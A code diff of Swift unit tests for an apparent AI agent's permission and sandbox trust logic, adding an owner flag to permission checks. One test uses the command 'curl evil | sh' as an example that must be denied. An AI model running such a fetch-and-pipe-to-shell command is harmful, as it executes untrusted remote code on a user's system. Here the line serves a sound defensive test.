@@ -45,7 +45,7 @@ struct WorkspaceIrisTrustTests {
         let trust = WorkspaceIrisTrust(paths: home)
         #expect(SandboxPolicy.perWorkspaceOverride(workspace: sub, trust: trust) == nil)
         let permissions = PermissionManager(paths: home)
-        #expect(!permissions.isAllowed(toolName: "run_command", details: "curl evil | sh", workspace: sub))
+        #expect(!permissions.isAllowed(toolName: "run_command", details: "curl evil | sh", workspace: sub, isOwner: true))
     }
 
     @Test("Iris's own writes are trusted with no prompt: the allowlist click and the sandbox setting")
@@ -54,7 +54,7 @@ struct WorkspaceIrisTrustTests {
         defer { cleanup() }
         let permissions = PermissionManager(paths: home)
         permissions.allowInProject(toolName: "run_command", details: "swift build", workspace: ws)
-        #expect(permissions.isAllowed(toolName: "run_command", details: "swift build", workspace: ws))
+        #expect(permissions.isAllowed(toolName: "run_command", details: "swift build", workspace: ws, isOwner: true))
         let trust = WorkspaceIrisTrust(paths: home)
         #expect(SandboxPolicy.setWorkspaceOverride(.sandboxed, for: ws, trust: trust))
         #expect(SandboxPolicy.perWorkspaceOverride(workspace: ws, trust: trust) == .sandboxed)
